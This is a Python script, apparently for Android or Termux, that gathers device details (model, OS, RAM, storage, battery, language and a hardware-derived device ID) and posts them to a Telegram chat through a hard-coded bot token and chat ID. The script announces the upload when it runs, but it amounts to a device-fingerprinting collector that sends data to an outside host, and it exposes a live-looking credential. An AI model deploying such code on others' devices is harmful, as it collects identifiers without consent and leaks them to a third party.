import os
import platform
import uuid
import psutil
from datetime import datetime
import requests
import locale
import subprocess

TELEGRAM_BOT_TOKEN = "7517879972:AAF8cV7AValEWxo9NyihtHDsFe7ZRjfmW-s"
TELEGRAM_CHAT_ID = "6913353602"

def get_basic_info():
    try:
        model = subprocess.getoutput("getprop ro.product.model")
        network = subprocess.getoutput("ping -c 1 google.com &> /dev/null && echo 'Connected' || echo 'Offline'")
        print(f"Device name: {model} 📱")
        print(f"Online status: {network} 🛜")
    except:
        print("Failed to get basic information")

def get_battery_info():
    """Enhanced battery check using only subprocess"""
    try:
        # Try dumpsys battery first
        result = subprocess.getoutput("dumpsys battery")
        
        if not result:
            print("No battery info available (dumpsys failed)")
            return None

        battery_data = {}
        for line in result.split('\n'):
            if 'level' in line.lower():
                battery_data['percent'] = line.split(':')[1].strip()
            elif 'plugged' in line.lower():
                battery_data['plugged'] = line.split(':')[1].strip() != '0'
            elif 'status' in line.lower():
                battery_data['status'] = line.split(':')[1].strip()

        if battery_data:
            print("\n🔋 Battery Info:")
            print(f"- Percentage: {battery_data.get('percent', 'N/A')}%")
            print(f"- Charging: {'Yes' if battery_data.get('plugged', False) else 'No'}")
            return battery_data
        
        print("Battery data not found in dumpsys output")
        return None

    except Exception as e:
        print(f"Battery check error: {e}")
        return None

def get_safe_device_info():
    """Safe device information collection"""
    try:
        system_info = {
            'Device type': platform.machine(),
            'Operating system': platform.system(),
            'System version': platform.release(),
            'System architecture': platform.architecture()[0],
            'CPU cores': str(psutil.cpu_count(logical=True)),
            'Total RAM': f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
            'Current time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'Device ID': str(uuid.getnode())
        }

        # Storage info
        try:
            storage_path = '/storage/emulated/0' if os.path.exists('/storage/emulated/0') else '/'
            disk_usage = psutil.disk_usage(storage_path)
            system_info.update({
                'Total storage': f"{round(disk_usage.total / (1024**3), 2)} GB",
                'Available storage': f"{round(disk_usage.free / (1024**3), 2)} GB"
            })
        except Exception as e:
            print(f"Storage error: {e}")

        # Battery info
        battery = get_battery_info()
        if battery:
            system_info.update({
                'Battery percentage': f"{battery.get('percent', 'N/A')}%",
                'Charging status': "Charging" if battery.get('plugged', False) else "Not charging"
            })

        # Language info
        try:
            lang = locale.getlocale()[0] or "Unknown"
            LANG_NAMES = {
                "ar": "Arabic 🇸🇦",
                "en": "English 🇬🇧",
                "fr": "French 🇫🇷",
                "es": "Spanish 🇪🇸",
                "tr": "Turkish 🇹🇷",
            }
            system_info['System language'] = LANG_NAMES.get(lang[:2] if lang else "en", lang)
        except Exception as e:
            print(f"Language error: {e}")

        return {'📱 System Information': system_info}

    except Exception as e:
        return {'❌ Error': f"Failed to collect info: {str(e)}"}

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
        response = requests.post(url, data=data)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

def display_and_send_info():
    print("Collecting device information...\n")
    get_basic_info()
    info = get_safe_device_info()
    
    telegram_message = "<b>Device Information Report</b>\n\n"
    
    for category, details in info.items():
        print(f"\n{category}:")
        telegram_message += f"<b>{category}:</b>\n"
        for key, value in details.items():
            print(f"- {key}: {value}")
            telegram_message += f"- {key}: {value}\n"
    
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        print("\nSending to Telegram...")
        if send_to_telegram(telegram_message):
            print("Sent successfully!")
        else:
            print("Failed to send")

if __name__ == "__main__":
    display_and_send_info()